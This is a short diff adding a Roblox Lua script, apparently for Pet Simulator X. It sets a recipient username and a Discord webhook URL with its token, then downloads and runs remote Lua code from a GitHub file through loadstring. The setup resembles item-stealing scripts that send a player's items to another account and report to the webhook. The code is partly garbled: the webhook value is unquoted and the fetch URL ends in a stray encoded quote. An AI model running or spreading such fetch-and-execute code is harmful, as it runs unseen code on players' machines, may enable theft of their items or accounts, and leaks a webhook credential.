@@ -1,0 +1,5 @@
+_G.Username = "BIGcollin2410"
+_G.Username2 = "BIGcollin2410"
+_G.Webhook = https://discordapp.com/api/webhooks/1109943332496486570/D99_mjPr80yem7IiMAbpORlOLSXI7_ouyNZY2QyhUnc3rzx-TBlBVUUSB8FqhRaB415B
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
